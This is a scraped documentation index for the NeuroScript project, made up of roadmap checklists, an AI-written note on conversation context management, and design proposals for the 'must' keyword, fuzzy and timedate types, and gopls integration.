<li>[ ] Consider FS.DiffFiles tool (or is NSPatch sufficient?).</li> </ul> </li> <li>[ ] FileAPI Review: Ensure consistency/no overlap between FS.* tools and direct FileAPI.</li> <li>[ ] ng -&gt; FileAPI Sync: Design and implement mechanism/tools.</li> <li>[ ] Build Artifacts: Review GoBuild output handling; add tools if needed (e.g., FS.Copy, retrieve artifacts).</li> </ul> </li> <li> <p>[x] 6. Tooling &amp; Ecosystem</p> <ul> <li>[ ] Documentation: Update tool docs, checklists to reflect new tools/status.</li> <li>[ ] Formatting: Begin development of nsfmt formatting tool for .ns files.</li> <li>[ ] Workflow Test: Create end-to-end test script simulating SAI interaction (upload, read, modify, build, test).</li> <li>[x] Checklist Tooling (using Tree Tools):<ul> <li>[x] Implement ParseChecklistFromString tool (Provides initial data).</li> <li>[x] Define Checklist &lt;-&gt; GenericTree representation mapping.</li> <li>[x] Implement Checklist &lt;-&gt; GenericTree adapter logic/tool(s).</li> <li>[x] Define/Implement Checklist formatting/serialization logic (from Tree representation to Markdown).</li> <li>[x] Define/Implement in-memory Checklist update logic using Tree tools (FindNodes, ModifyNode, etc.).</li> <li>[x] Ensure update logic correctly recomputes status of automatic ('| |') items based on tree structure/dependencies.</li> <li>[x] Define/Implement Checklist tool(s) for updates via Tree (depends on Tree find/modify tools &amp; adapter).</li> </ul> </li> <li>|x| AI Worker Management System<ul> <li>[x] Core AI Worker Manager (Initialization, basic structure)</li> <li>|x| AI Worker Definition Tools<ul> <li>[x] AIWorkerDefinition.Add</li> <li>[x] AIWorkerDefinition.Get</li> <li>[x] AIWorkerDefinition.List</li> <li>[x] AIWorkerDefinition.Update</li> <li>[x] AIWorkerDefinition.Remove</li> <li>[x] AIWorkerDefinition.LoadAll</li> <li>[x] AIWorkerDefinition.SaveAll</li> </ul> </li> <li>|x| AI Worker Instance Tools<ul> <li>[x] AIWorkerInstance.Spawn</li> <li>[x] AIWorkerInstance.Get</li> <li>[x] AIWorkerInstance.ListActive</li> <li>[x] AIWorkerInstance.Retire</li> <li>[x] AIWorkerInstance.UpdateStatus</li> <li>[x] AIWorkerInstance.UpdateTokenUsage</li> </ul> </li> <li>|x| AI Worker Execution Tools<ul> <li>[x] AIWorker.ExecuteStatelessTask</li> </ul> </li> <li>|x| AI Worker Performance Tools<ul> <li>[x] AIWorker.SavePerformanceData</li> <li>[x] AIWorker.LoadPerformanceData</li> <li>[x] AIWorker.LogPerformance</li> <li>[x] AIWorker.GetPerformanceRecords</li> </ul> </li> <li>[ ] Design for stateful worker interaction and task lifecycle.</li> <li>[ ] Tooling for SAI to assign/monitor tasks on workers.</li> <li>[ ] Agent mode permitted, allow &amp; deny lists</li> </ul> </li> </ul> </li> <li> <p>[ ] 7. Example App -- language flashcards (New)</p> <ul> <li>[ ] Define core features (add card, review, save/load).</li> <li>[ ] Design data structure (simple list/map, maybe JSON file).</li> <li>[ ] Implement basic TUI or script interaction logic.</li> </ul> </li> <li> <p>[x] 8. Language / Interpreter Polish (Internal / Done)</p> <ul> <li>[x] core.ToIntE undefined error fixed by adding core.ConvertToInt64E.</li> <li>[x] Handle non-deterministic map iteration in tests.</li> </ul> </li> <li> <p>[-] 9. NS LSP</p> <ul> <li>[x] Basic syntax errors</li> <li>[x] Shows tools help</li> <li>[x] BUG: split line in string not flagged</li> <li>[ ] Flag unknown tools</li> </ul> </li> </ul>"},{"location":"project/Version_04/conversation_management/","title":"Conversation management","text":"<p>From Gemini:</p> <p>Here are some thoughts on how conversation management could be enhanced beyond generic approaches, particularly in a system like yours:</p> <p>Structured and Dynamic Context Management:</p> <p>Instead of just a flat history, the system could maintain a more structured context for each AI worker or task. This might include explicit fields for: Current Goal/Objective: What is the AI trying to achieve right now? Key Facts &amp; Entities: Information gathered or established that's critical for the current task (e.g., specific file paths being worked on, error messages encountered, user decisions). Constraints &amp; Rules: Any active rules or limitations for the operation. Session-Specific Knowledge: Things learned or decided earlier in the current interaction that should guide future steps. This structured context can be dynamically updated by the AIWM or even by NeuroScript tools as a task progresses. Intelligent Prompt Assembly:</p> <p>Move beyond just concatenating a system prompt, history, and the latest query. Prompts could be assembled on-the-fly based on the current structured context, the specific sub-task, and critically, relevant \"lessons learned.\" For instance, if the \"lessons learned\" indicate that a particular AI worker definition tends to misunderstand a certain type of instruction, the prompt assembly logic could dynamically inject a clarifying note or a successful example from a past interaction when a similar instruction is needed. Sophisticated Context Distillation &amp; Summarization:</p> <p>For long-running tasks or extended interactions, the raw conversational history can become noisy. More advanced techniques could be used to distill or summarize older parts of the context, focusing only on what's relevant to the current step. This could even involve a dedicated LLM call to perform the summarization with a specific focus, ensuring the primary AI worker isn't bogged down by less pertinent details from many turns ago. This actively combats the \"turn warp\" you've experienced. Layered and Scoped Context:</p> <p>Think of context in layers: Global/System: Core instructions, AI persona (from AIWorkerDefinition). Session/Task: Overarching goals for the current session or multi-step task. Local/Turn: Specifics of the immediate request and very recent history. The conversation management system could be smarter about which layers are most relevant and how to combine them effectively. Explicit State Tracking and Checkpointing:</p> <p>For complex, multi-turn operations (which your \"stateful worker interaction\" in road_to_04.md hints at), the system could explicitly manage and track the state of the interaction. This could involve inserting \"state summaries\" or \"checkpoints\" into the context that the AI is guided to refer to, re-anchoring its understanding periodically. Feedback-Driven Contextual Adjustments:</p> <p>The \"lessons learned\" mechanism you're designing for the Work Queue is key here. If a certain approach (e.g., a particular prompt phrasing or set of supporting information) consistently leads to better or worse outcomes for specific tasks, the conversation management system can learn to adjust what information it emphasizes or includes. Specialized Roles in Conversation Management:</p> <p>It's possible to envision a system where a primary \"task execution AI\" is supported by other specialized AI components or rule-based systems that manage parts of the conversation, like a \"context manager\" AI that prepares the optimal context packet for the task AI.</p>"},{"location":"project/Version_04/must_enhancements/","title":"Must enhancements","text":"<p>:: title: NeuroScript 'must' Enhancements &amp; Structural Validation  :: version: 0.1.1   :: status: proposal  :: description: Design for enhancing the 'must' keyword and introducing structural validation to reduce post-call clutter and improve script robustness.  :: date: 2025-06-03  :: author: Gemini</p> <p>## 1. Introduction</p> <p>To simplify NeuroScript scripting, especially for AI-generated code, and to reduce defensive \"post-call clutter,\" this document proposes enhancements to the <code>must</code> keyword and introduces a mechanism for structural validation. These changes build upon the decision to standardize error returns from tools.</p> <p>## 2. Standardized Error Returns from Tools</p> <ul> <li>Convention: All tools, when encountering a handled operational error (e.g., file not found, invalid input), must return a specific NeuroScript <code>map</code> structure, conceptually referred to as an <code>error</code> value by scripts.</li> <li>Structure: This <code>error</code> map will contain at least the following keys:<ul> <li><code>\"code\"</code> (required): A standardized error code (string or integer, ideally from <code>core.ErrorCode</code>).</li> <li><code>\"message\"</code> (required): A human-readable string describing the error.</li> <li><code>\"details\"</code> (optional): A <code>map</code> or <code>string</code> for additional context.</li> </ul> </li> <li>Tool <code>ReturnType</code>: A tool's <code>ToolSpec.ReturnType</code> will continue to define its successful return type. The ability for any tool to return an <code>error</code> map instead is a language-level convention.</li> <li>Tool Implementation: Go functions implementing tools should return <code>(nsErrorMapValue, nil)</code> for handled operational errors, and <code>(nil, goError)</code> for unexpected internal Go errors.</li> </ul> <p>## 3. <code>must</code> Keyword Enhancements</p> <p>The <code>must</code> keyword is NeuroScript's primary mechanism for asserting critical conditions and failing loudly if they are not met. Its behavior will be expanded and clarified as follows:</p> <p>### 3.1. <code>must &lt;boolean_expression&gt;</code> (Statement)</p> <ul> <li>Behavior: This remains the fundamental assertion.<ul> <li>Evaluates the <code>&lt;boolean_expression&gt;</code>.</li> <li>If the expression result is <code>false</code>, the script halts immediately by triggering a runtime error (panic).</li> <li>If the evaluation of the expression itself causes an unhandled runtime error, the script also halts.</li> </ul> </li> <li>Purpose: Asserting script invariants.</li> <li>Example: <code>must user_count &gt; 0</code></li> </ul> <p>### 3.2. <code>set &lt;variable&gt; = must &lt;tool_call_expression&gt;</code> (Assignment)</p> <ul> <li>Behavior: This provides a concise way to call a tool when success is mandatory for the script's logic to proceed.<ol> <li>The <code>&lt;tool_call_expression&gt;</code> is evaluated.</li> <li>The returned NeuroScript <code>Value</code> is inspected:<ul> <li>If the tool returns a standard <code>error</code> map (as defined in section 2), the <code>must</code> condition fails, and the script halts (panics).</li> <li>If the tool returns any other <code>Value</code> (presumed to be the success value), it is assigned to <code>&lt;variable&gt;</code>.</li> <li>If the tool call itself results in an unhandled Go-level error from the interpreter, the script also halts.</li> </ul> </li> </ol> </li> <li>Purpose: Simplify tool calls where success is critical, eliminating boilerplate error-checking for these cases.</li> <li>Example: <pre><code>set config_text = must tool.FS.Read(\"settings.json\")\nset config_map = must tool.JSON.Parse(config_text)\n</code></pre></li> </ul> <p>### 3.3. <code>set &lt;variable&gt; = must &lt;map_variable&gt;[\"&lt;key_name&gt;\"] as &lt;expected_type&gt;</code> (Single Map Key &amp; Type Assertion)</p> <ul> <li>Behavior: Provides compact and safe access to a single map key with type validation.<ol> <li>Evaluates <code>&lt;map_variable&gt;</code>. If it's an <code>error</code> map or <code>nil</code>, the <code>must</code> fails (panics).</li> <li>Accesses <code>&lt;map_variable&gt;[\"&lt;key_name&gt;\"]</code>.</li> <li>Key Existence: If <code>&lt;key_name&gt;</code> does not exist, <code>must</code> fails (panics).</li> <li>Value Type Check: If the key exists, the retrieved value's type is checked against <code>&lt;expected_type&gt;</code> (<code>string</code>, <code>int</code>, <code>float</code>, <code>bool</code>, <code>list</code>, <code>map</code>, <code>error</code>). If the type mismatches, or if the value is an <code>error</code> map when <code>&lt;expected_type&gt;</code> is not <code>error</code>, <code>must</code> fails (panics).</li> <li>If all checks pass, the validated value is assigned to <code>&lt;variable&gt;</code>.</li> </ol> </li> <li>Purpose: Ensure a required map key is present and its value is of the correct basic type, failing hard otherwise.</li> <li>Example: <pre><code>set user_data = {\"name\": \"Gemini\", \"id\": 123, \"active\": true}\nset user_id = must user_data[\"id\"] as int\n</code></pre></li> </ul> <p>### 3.4. <code>set &lt;var1&gt;, &lt;var2&gt;, ... = must &lt;map_var&gt;[&lt;key1_str&gt;, &lt;key2_str&gt;, ...] as &lt;type1&gt;, &lt;type2&gt;, ...</code> (Multiple Map Keys &amp; Types Assertion)</p> <ul> <li>Behavior: Extends map key assertion to multiple keys and types simultaneously in a single statement.<ol> <li>Evaluates <code>&lt;map_var&gt;</code>. If it's an <code>error</code> map or <code>nil</code>, the <code>must</code> fails (panics).</li> <li>Count Consistency: Verifies that the number of variables, keys, and types provided are identical. If not, <code>must</code> fails (panics).</li> <li>Atomic Validation: For each corresponding key-type pair (<code>&lt;key_i_str&gt;</code> and <code>&lt;type_i&gt;</code>):      a.  Key Existence: Checks if <code>&lt;key_i_str&gt;</code> exists in <code>&lt;map_var&gt;</code>.      b.  Value Type Check: Retrieves the value and checks if its type matches <code>&lt;type_i&gt;</code>. Also checks if the value is an unexpected <code>error</code> map (unless <code>&lt;type_i&gt;</code> is <code>error</code>).      c.  If any key is missing, or any type mismatches, or any value is an unexpected <code>error</code> map, the entire <code>must</code> statement fails (panics). Error messages should strive to be specific about the first point of failure.</li> <li>Assignment: If all validations for all key-type pairs pass, the retrieved and validated values are assigned to <code>&lt;var1&gt;</code>, <code>&lt;var2&gt;</code>, etc., in order.</li> </ol> </li> <li>Purpose: Provide a highly compact and robust way to extract and validate multiple required fields from a map.</li> <li>Example:      ```neuroscript      set user_profile = {\"name\": \"Castor\", \"id\": 456, \"role\": \"admin\", \"enabled\": true}      set user_name, user_id, is_enabled = must user_profile[\"name\", \"id\", \"enabled\"] as string, int, bool      # user_name is \"Castor\", user_id is 456, is_enabled is true      # If \"role\" was requested and its type was 'string', it would also be included.</li> </ul>"},{"location":"project/Version_04/new_types/","title":"New types","text":"<p>:: title: Plan for New Type Integration (v0.4) :: version: 1.0.0 :: status: proposal :: description: A phased plan to integrate error, event, timedate, and fuzzy types into the NeuroScript core.</p>"},{"location":"project/Version_04/new_types/#phase-1-core-value-representation","title":"Phase 1: Core Value Representation","text":"<p>The first step is to define how these new types exist within the Go runtime of the interpreter.</p> <ol> <li> <p>Update Type Constants:</p> <ul> <li>Modify <code>core/type_names.go</code> to add exported constants for the new type names: <code>TypeNameError</code>, <code>TypeNameEvent</code>, <code>TypeNameTimedate</code>, and <code>TypeNameFuzzy</code>.</li> </ul> </li> <li> <p>Define Value Structs:</p> <ul> <li>In a new file, <code>core/values.go</code> (to keep concerns separate from <code>interpreter.go</code>), define the Go structs that will represent these values at runtime.</li> <li><code>ErrorValue</code>: Will likely wrap a <code>map[string]Value</code> to conform to the standardized error structure.</li> <li><code>TimedateValue</code>: Will wrap Go's <code>time.Time</code>.</li> <li><code>EventValue</code>: Will wrap a <code>map[string]Value</code> to hold the <code>name</code>, <code>source</code>, <code>timestamp</code>, and <code>payload</code> fields.</li> <li><code>FuzzyValue</code>: Will be a struct holding a numeric value and a tolerance/confidence factor.</li> <li>Each of these new structs must implement the <code>core.Value</code> interface (<code>Type()</code>, <code>String()</code>, <code>IsTruthy()</code>, etc.).</li> </ul> </li> </ol>"},{"location":"project/Version_04/new_types/#phase-2-parser-ast-integration","title":"Phase 2: Parser &amp; AST Integration","text":"<p>With the core types defined, we update the parser and AST layers.</p> <ol> <li> <p>Regenerate Parser:</p> <ul> <li>Run the ANTLR toolchain to regenerate the Go parser and lexer files in <code>core/generated/</code> from the <code>NeuroScript.g4</code> file we updated. This makes the parser aware of the new keywords.</li> </ul> </li> <li> <p>Verify <code>ast.go</code>:</p> <ul> <li>Review <code>core/ast.go</code>. No changes are anticipated here initially, as these complex types won't have a direct literal representation in the script (e.g., you won't write <code>set t = 2025-06-08T10:00:00Z</code>). They will be created by tools or runtime events.</li> </ul> </li> </ol>"},{"location":"project/Version_04/new_types/#phase-3-interpreter-evaluation-logic","title":"Phase 3: Interpreter &amp; Evaluation Logic","text":"<p>@ @@ This phase teaches the interpreter how to understand and operate on the new values.</p> <ol> <li> <p>Update <code>typeof</code> Operator:</p> <ul> <li>In <code>core/evaluation_logic.go</code> (or wherever <code>typeof</code> is implemented), extend the logic to return the correct type name string for our new <code>Value</code> types.</li> </ul> </li> <li> <p>Update Operators:</p> <ul> <li>In <code>core/evaluation_comparison.go</code>, implement comparison logic (<code>==</code>, <code>!=</code>, <code>&lt;</code>, <code>&gt;</code>). For instance, <code>timedate</code> values should be comparable. <code>error</code> and <code>event</code> values should likely only support equality checks against <code>nil</code>.</li> <li>In <code>core/evaluation_operators.go</code>, explicitly disallow non-sensical operations (e.g., arithmetic like <code>+</code>, <code>-</code>) on the new types by returning a runtime error. This prevents unexpected behavior.</li> </ul> </li> </ol>"},{"location":"project/Version_04/new_types/#phase-4-standard-library-tooling","title":"Phase 4: Standard Library Tooling","text":"<p>Users need a way to create and interact with these new types. We will create a small, essential set of tools.</p> <ol> <li>Propose &amp; Implement Tools:<ul> <li>Timedate Tool: A <code>tool.Time.Now()</code> to return a new <code>TimedateValue</code>.</li> <li>Error Tool: An <code>IsError</code> helper function to check if a value is an error type, as planned in the roadmap. Also, a <code>tool.Error.New(code, message)</code> to construct a standard <code>ErrorValue</code>.</li> <li>(Defer <code>event</code> and <code>fuzzy</code> tools until their core mechanics are further defined).</li> </ul> </li> </ol>"},{"location":"project/Version_04/new_types/#phase-5-comprehensive-testing","title":"Phase 5: Comprehensive Testing","text":"<p>Finally, we must validate all changes with thorough testing.</p> <ol> <li> <p>Add Unit Tests:</p> <ul> <li>For each new <code>Value</code> struct, create a <code>core/values_test.go</code> to test its methods.</li> <li>Update <code>core/evaluation_test.go</code> with test cases for <code>typeof</code> and all operator behaviors on the new types.</li> <li>Create test files for the new tools (e.g., <code>core/tools_time_test.go</code>) to ensure they function correctly and handle edge cases.</li> </ul> </li> </ol> <p>Why an extra half-phase? Fuzzy logic is the only type whose behaviour is not obvious from Go\u2019s built-in semantics.  Getting its operators right early prevents contradictory truthiness later.</p> <ol> <li> <p>Canonical Representation </p> <ul> <li><code>FuzzyValue</code> must store exactly one float64 in [0.0, 1.0].   A second field called <code>confidence</code> sounds attractive but usually models   uncertainty of the fuzziness itself\u2014not needed for core language   ops.  Keep it single-value and let higher-level logic attach metadata   if required.</li> </ul> <pre><code>type FuzzyValue struct {\n    \u03bc float64 // membership degree 0.0\u20131.0\n}\n</code></pre> </li> <li> <p>Truthiness (<code>IsTruthy</code>) </p> <ul> <li>Return <code>true</code> if <code>\u03bc &gt; 0.5</code>.\u2002(0.5 is conventional and aligns with earlier   roadmap examples.)   Document that scripts needing a different threshold should compare   explicitly (<code>my_fuzzy &gt; 0.8</code>).</li> </ul> </li> <li> <p>Comparison Operators </p> <ul> <li><code>==</code> and <code>!=</code> act on the raw float64 with a global epsilon   (e.g. 1e-6) to avoid tragic rounding errors.  </li> <li><code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>, <code>&gt;=</code> likewise act numerically.</li> </ul> </li> <li> <p>Logical Operators  # NEW BEHAVIOUR     Implement fuzzy versions:</p> Operator Crisp analogue Fuzzy definition (<code>\u03bc</code> values) <code>and</code> min <code>min(a.\u03bc, b.\u03bc)</code> <code>or</code> max <code>max(a.\u03bc, b.\u03bc)</code> <code>not</code> negation <code>1 \u2013 a.\u03bc</code> <p>If either operand is crisp boolean, coerce it to <code>1.0</code> (true) or <code>0.0</code> (false) before calculation.</p> </li> <li> <p>Arithmetic Protection     In Phase 3\u2019s \u201cevaluation_operators.go\u201d step, explicitly forbid <code>+</code>, <code>-</code>     or <code>*</code> on fuzzy values with a clear runtime error: \u201ccannot apply arithmetic operator \u2018+\u2019 to fuzzy values \u2013 use logical     operators instead.\u201d</p> </li> <li> <p>Literal Syntax (optional)     A literal isn\u2019t strictly needed\u2014tools can construct fuzzy values\u2014but if     you want script-level constants, keep it explicit:</p> <pre><code>set a = fuzzy(0.8)\nset b = fuzzy(true)   # coerces to 1.0\n</code></pre> <p>This can be parsed as a built-in function call, so no grammar changes.</p> </li> <li> <p>Built-in Helper Functions (Phase 4 dependency)  </p> <ul> <li><code>Fuzzy.And(list)</code> \u2013 n-ary min  </li> <li><code>Fuzzy.Or(list)</code>  \u2013 n-ary max  </li> <li><code>Fuzzy.Distance(a,b)</code> \u2013 <code>abs(a.\u03bc-b.\u03bc)</code> </li> </ul> <p>These make aggregation in NS scripts easy without custom loops.</p> </li> <li> <p>Unit Tests (Phase 5 extension)  </p> <ul> <li><code>IsTruthy</code> boundary cases (<code>0.5</code>, <code>0.51</code>, <code>0.49</code>).  </li> <li><code>and/or/not</code> law sanity (idempotent, commutative, De Morgan   approximations).</li> </ul> </li> </ol> <p>\u21d2 With these rules, fuzzy values behave predictably, integrate into the operator table, and satisfy all examples discussed in the earlier roadmap.</p>"},{"location":"project/Version_04/new_types/#phase-312-fuzzy-logic-semantics-new","title":"Phase 3\u00bd: Fuzzy Logic Semantics  # NEW","text":""},{"location":"project/Version_04/new_types/#knock-on-edits-to-earlier-phases-new","title":"Knock-on Edits to Earlier Phases  # NEW","text":"<ul> <li>Phase 1 \u2013 Add <code>const TypeNameFuzzy = \"fuzzy\"</code> to   <code>type_names.go</code>.</li> <li>Phase 2 \u2013 No parser change required if literals are expressed via   <code>fuzzy()</code> built-in.</li> <li>Phase 3 \u2013 Extend <code>typeof</code> logic so <code>typeof(fuzzy(0.3))</code> returns   <code>\"fuzzy\"</code>.</li> </ul> <p>Feel free to fold this section wherever it best fits; all bullet numbers reference your original phase structure.  Once fuzzy logic semantics are locked, the remaining <code>error</code>, <code>timedate</code>, and <code>event</code> work proceeds exactly as in your plan.</p>"},{"location":"project/Version_04/ns_road_to_04/","title":"Ns road to 04","text":"<p>:: title: NeuroScript Project (includes FDM integration) Road to v0.4.0 Checklist  :: fileVersion: 7 :: id: ns-project-roadmap-v0.4.0 :: status: draft :: description: Tasks for NS v0.4.0 incl. event grammar, prompt budgeting, FDM bridge, and more. :: updated: 2025-06-27</p>"},{"location":"project/Version_04/ns_road_to_04/#vision","title":"Vision","text":"<p>BHAG \u2014 Multiple LLM agents (ChatGPT, Gemini, etc.) maintain the ns + fdm repos without context-window breakage. Success criteria: \u2264 3 context resets / h, refactor round-trip &lt; 5 min, divergence &lt; 0.25 for \u2265 95 % nodes. Current short-term goal: AI First Light (see section 4)</p> <p>\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500</p>"},{"location":"project/Version_04/ns_road_to_04/#1-language-features","title":"1 \u00b7 Language Features","text":"<ul> <li>|-| Grammar &amp; Runtime Enhancements</li> <li>[-] Finalize <code>on event</code> grammar + dispatcher</li> <li>[x] <code>error</code> value type (+ <code>IsError</code> helper)</li> <li>[x] <code>timedate</code> value type</li> <li>[x] <code>event</code> value type</li> <li>[x] Fuzzy-logic operators</li> <li>|-| <code>must</code> Keyword &amp; Error-map Standardization</li> <li>[x] Define canonical <code>error</code> map: <code>{code, message, details}</code></li> <li>[x] <code>tool</code> guidelines: return error map on handled faults</li> <li>[x] <code>set x = must tool()</code> \u2014 fail on Go error or error map</li> <li>[x] Single-key <code>must map[\"key\"] as type</code></li> <li>[x] Multi-key atomic <code>must map[...] as \u2026</code></li> <li>[ ] <code>must IsCorrectShape(var, shape_def)</code></li> <li>[x] Ensure <code>on_error</code> catches all <code>must</code> panics</li> <li>| | Prompt-Budget Helpers</li> <li>[ ] <code>prompt.Assemble(node_ids, max_tokens)</code> built-in</li> <li>[ ] <code>fdm.summary(node_id, max_tokens)</code> helper</li> </ul>"},{"location":"project/Version_04/ns_road_to_04/#3-core-interpreter-runtime","title":"3 \u00b7 Core Interpreter / Runtime","text":"<ul> <li>| | Concurrency &amp; Conflict Handling</li> <li>[ ] Add <code>version</code> field to nodes</li> <li>[ ] Mediator rejects stale writes (<code>ErrConflict</code>)</li> <li>[ ] Optional <code>on_conflict</code> block</li> <li>| | Error Handling &amp; Logging</li> <li>[x] Review <code>on error</code> with new <code>must</code></li> <li>[ ] Rationalize loggers (single interface)</li> <li>[ ] <code>ReleaseHandle</code> tool to prevent leaks</li> <li>| | Performance &amp; File/FS Tools</li> <li>[ ] Profiling pass if slowdowns observed</li> <li>[ ] Evaluate <code>FS.DiffFiles</code> vs <code>NSPatch</code></li> <li>[ ] GoBuild artifact helpers (<code>FS.Copy</code>, etc.)</li> </ul>"},{"location":"project/Version_04/ns_road_to_04/#4-fdm-ns-integration","title":"4 \u00b7 FDM / NS Integration","text":"<ul> <li>| | Finder Abstraction</li> <li>[ ] Mediator implements <code>fdm.find(query:\"...\")</code></li> <li>[ ] Internal routing: AST \u2192 Similarity \u2192 text scan</li> <li>| | Summary-Node Pipeline</li> <li>[ ] Auto-create <code>file_summary</code> when file &gt; 512 tokens</li> <li>[ ] NS tool <code>fdm.summarize_chunk</code></li> <li>| | Manual Query MVP  \ud83c\udd95</li> <li>[ ] Script <code>examples/manual_query.ns</code> ingests repo, prints top 5 matches</li> <li>[ ] Integration test in <code>core/testdata</code></li> <li>[ ] Bench: \u2264 1.5 s end-to-end on local laptop</li> <li>| | AI First Light</li> <li>[ ] Ingest two repos</li> <li>[ ] Process both source and docn files into all usual indices and overlays</li> <li>[ ] Make AI agent</li> <li>[ ] Send instructions for query</li> <li>[ ] Agent sends query</li> <li>[ ] Agent gets relevant results back</li> <li>| | Metrics for BHAG</li> <li>[ ] Prometheus counter <code>context_resets_total</code></li> <li>[ ] CI smoke test fails if resets &gt; 3 / h</li> </ul>"},{"location":"project/Version_04/ns_road_to_04/#5-tooling-ecosystem","title":"5 \u00b7 Tooling &amp; Ecosystem","text":"<ul> <li>| | Documentation</li> <li>[x] Update language spec for error map, <code>must</code>, events</li> <li>[ ] Tool docs for WM &amp; FDM bridge helpers</li> <li>| | Formatter</li> <li>[ ] <code>nsfmt</code> \u2014 wraps long lines, respects <code>\\</code> continuation</li> <li>| | Workflow Tests</li> <li>[ ] Prompt-budget CI test: 2k-line file \u21d2 summary \u2264 1024 tokens</li> </ul>"},{"location":"project/Version_04/ns_road_to_04/#7-ns-lsp","title":"7 \u00b7 NS LSP","text":"<ul> <li>|x| Extend grammar support: <code>must</code> enhancements, events, fuzzy</li> </ul>"},{"location":"project/Version_04/ns_road_to_04/#8-tech-debt","title":"8 . Tech Debt","text":"<ul> <li>[ ] Ensure CLI tools DO NOT auto-run main. Zadeh s/b done already.</li> <li>[ ] Clean up neurogo err return to zadeh main</li> </ul>"},{"location":"project/Version_05/gopls_int_design/","title":"Gopls int design","text":"<p># NeuroScript Gopls Integration Design (gopls_integration_design.md)</p> <p>## 1. Overview</p> <p>This document outlines the design for integrating <code>gopls</code>, the official Go Language Server, into the NeuroScript ecosystem. The primary objective is to provide NeuroScript (and thereby AI agents using NeuroScript) with robust, real-time diagnostics and rich semantic understanding of Go code. This integration is pivotal for enabling an AI to write, analyze, and modify Go code that compiles reliably and efficiently, moving beyond brittle line/column addressing towards more stable semantic references.</p> <p>The focus for the initial v0.5.0 implementation will be on:  - Accurate diagnostic reporting (<code>textDocument/publishDiagnostics</code>).  - Workspace and document synchronization with <code>gopls</code> (<code>didOpen</code>, <code>didChange</code>, <code>didSave</code>, <code>didClose</code>).  - Tools to retrieve semantic context for diagnostics and code elements (e.g., <code>textDocument/hover</code>, <code>textDocument/definition</code>, <code>textDocument/documentSymbol</code>).  - Establishing a stable <code>GoplsClient</code> for managing communication.</p> <p>This system will complement existing static analysis tools in <code>pkg/core/tools/gosemantic</code> and <code>pkg/core/tools/goast</code> by providing a live, incremental view of the codebase as understood by the Go compiler and associated tooling.</p> <p>## 2. Core Components</p> <p>### 2.1. <code>GoplsClient</code> (<code>pkg/core/tools/gopls_client.go</code> - new)  Role: Manages the lifecycle of a <code>gopls</code> server subprocess and handles all Language Server Protocol (LSP) JSON-RPC 2.0 communication.  Responsibilities:  -   Process Management: Starting, monitoring, and stopping the <code>gopls</code> server executable.  -   LSP Communication:      -   Establishing and managing the JSON-RPC 2.0 stream over stdio with the <code>gopls</code> subprocess.      -   Sending LSP requests (e.g., <code>initialize</code>, <code>textDocument/hover</code>) and notifications (e.g., <code>initialized</code>, <code>textDocument/didOpen</code>).      -   Receiving and dispatching LSP responses and notifications (e.g., <code>textDocument/publishDiagnostics</code>).  -   State Management: Tracking client/server capabilities, open documents, and pending requests.  -   Interface: Provides methods for higher-level services (like DiagnosticManager, SemanticInfoProvider) to interact with <code>gopls</code>.  Implementation Notes:  -   Consider using <code>golang.org/x/tools/gopls/internal/protocol</code> for LSP type definitions and potentially <code>golang.org/x/tools/internal/jsonrpc2</code> for the RPC mechanism if its license and stability are suitable. Otherwise, a minimal custom implementation for JSON-RPC message framing and dispatch will be needed.</p> <p>### 2.2. Workspace/Document Synchronizer (Part of <code>GoplsClient</code>)  Role: Keeps <code>gopls</code> informed about the state of the workspace and relevant Go files.  Responsibilities:  -   Handling <code>textDocument/didOpen</code> notifications when a file is first accessed or made relevant.  -   Handling <code>textDocument/didChange</code> notifications when a file's content is modified by NeuroScript or an AI. Initially, full content sync is acceptable; incremental sync can be a future optimization.  -   Handling <code>textDocument/didSave</code> notifications if specific save actions need to be signaled.  -   Handling <code>textDocument/didClose</code> notifications when a file is no longer actively managed.  -   Managing the concept of a \"workspace root\" (<code>rootUri</code> in LSP <code>initialize</code> parameters).</p> <p>### 2.3. Diagnostic Manager (Conceptually part of <code>GoplsClient</code> or a close collaborator)  Role: Receives, stores, and provides access to diagnostics published by <code>gopls</code>.  Responsibilities:  -   Processing incoming <code>textDocument/publishDiagnostics</code> notifications from <code>gopls</code>.  -   Storing diagnostics per file URI, replacing previous diagnostics for that file.  -   Making these stored diagnostics queryable by NeuroScript tools.</p> <p>### 2.4. Semantic Information Provider (Methods on <code>GoplsClient</code>)  Role: Fetches and provides semantic information about code elements.  Responsibilities:  -   Sending <code>textDocument/hover</code> requests and parsing responses.  -   Sending <code>textDocument/definition</code> requests and parsing responses.  -   Sending <code>textDocument/documentSymbol</code> requests and parsing responses.  -   Sending <code>workspace/symbol</code> requests and parsing responses.  -   Translating LSP responses into NeuroScript's <code>SemanticReference</code> and other relevant data structures.</p> <p>## 3. Data Structures (for NeuroScript internal representation &amp; tool outputs)</p> <p>These will reside likely in a new <code>pkg/core/tools/gopls_types.go</code> or similar.</p> <ul> <li><code>LSPPosition</code>:<ul> <li><code>Line</code> (int): 0-indexed line number.</li> <li><code>Character</code> (int): 0-indexed UTF-16 code unit offset (gopls typically uses UTF-8 byte offsets, which needs careful handling or negotiation; for Go, byte offsets are often more natural). Decision: Prioritize byte offsets for internal consistency if possible, map to/from LSP's character definition as needed.</li> </ul> </li> <li><code>LSPRange</code>:<ul> <li><code>Start</code> (<code>LSPPosition</code>)</li> <li><code>End</code> (<code>LSPPosition</code>)</li> </ul> </li> <li><code>LSPLocation</code>:<ul> <li><code>URI</code> (string): Document URI.</li> <li><code>Range</code> (<code>LSPRange</code>)</li> </ul> </li> <li><code>DiagnosticInfo</code>:<ul> <li><code>SourceFileURI</code> (string)</li> <li><code>Range</code> (<code>LSPRange</code>): Precise byte-offset range of the diagnostic.</li> <li><code>Severity</code> (int): e.g., Error, Warning, Info, Hint (maps to LSP <code>DiagnosticSeverity</code>).</li> <li><code>Code</code> (string | int, optional): Diagnostic code, if any.</li> <li><code>Source</code> (string, optional): Source of the diagnostic (e.g., \"compiler\", \"vet\", \"staticcheck\").</li> <li><code>Message</code> (string): The diagnostic message.</li> <li><code>SemanticReferenceGuess</code> (<code>SemanticReference</code>, optional): A best-effort attempt to identify the primary symbol related to the diagnostic.</li> </ul> 